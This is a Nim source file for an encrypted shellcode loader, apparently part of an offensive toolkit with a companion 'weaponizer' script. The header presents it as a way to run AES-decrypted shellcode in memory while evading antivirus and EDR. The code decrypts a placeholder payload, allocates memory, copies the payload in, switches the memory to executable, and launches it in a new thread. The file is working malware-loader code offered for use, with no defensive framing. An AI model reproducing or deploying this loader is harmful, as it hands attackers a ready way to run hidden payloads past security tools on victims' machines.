# ==============================================================================
# 🍯 Zencefil Efendi's In-Memory Runner (Nim)
# Description: Decrypts AES-256 shellcode in memory and executes it using Windows APIs.
# Bypasses static analysis and disk-based AV/EDR signatures.
# Compile with: nim c -d:danger -d:strip --app:gui zencefil_runner.nim
# ==============================================================================

import winim/lean
import nimcrypto
import base64
import strutils

# ------------------------------------------------------------------------------
# ⚠️ REPLACE THESE VALUES WITH THE OUTPUT FROM zencefil-weaponizer.py
# ------------------------------------------------------------------------------
const b64_key = "YOUR_BASE64_KEY_HERE"
const b64_iv  = "YOUR_BASE64_IV_HERE"
const b64_payload = "YOUR_BASE64_ENCRYPTED_PAYLOAD_HERE"

proc decryptPayload(): seq[byte] =
  let key = decode(b64_key)
  let iv = decode(b64_iv)
  let ciphertext = decode(b64_payload)
  
  var ctx: CBC[aes256]
  ctx.init(cast[seq[byte]](key), cast[seq[byte]](iv))
  
  var plaintext = newSeq[byte](ciphertext.len)
  ctx.decrypt(cast[seq[byte]](ciphertext), plaintext)
  ctx.clear()
  
  return plaintext

proc executeInMemory(shellcode: seq[byte]) =
  # 1. Allocate memory with Read/Write permissions (PAGE_READWRITE to avoid early detection)
  let tProcess = GetCurrentProcess()
  let size = cast[SIZE_T](shellcode.len)
  
  var pAddress = VirtualAllocEx(
    tProcess,
    NULL,
    size,
    MEM_COMMIT or MEM_RESERVE,
    PAGE_READWRITE
  )
  
  # 2. Copy the decrypted shellcode into the allocated memory
  var bytesWritten: SIZE_T
  WriteProcessMemory(
    tProcess,
    pAddress,
    unsafeAddr shellcode[0],
    size,
    addr bytesWritten
  )
  
  # 3. Change permissions to Read/Execute (PAGE_EXECUTE_READ) right before execution
  var oldProtect: DWORD
  VirtualProtectEx(
    tProcess,
    pAddress,
    size,
    PAGE_EXECUTE_READ,
    addr oldProtect
  )
  
  # 4. Execute the payload via CreateThread
  var threadId: DWORD
  let tHandle = CreateThread(
    NULL,
    0,
    cast[LPTHREAD_START_ROUTINE](pAddress),
    NULL,
    0,
    addr threadId
  )
  
  # 5. Wait for the shellcode to finish
  WaitForSingleObject(tHandle, INFINITE)

when isMainModule:
  # Decrypt and run without ever touching the disk
  let decryptedShellcode = decryptPayload()
  executeInMemory(decryptedShellcode)
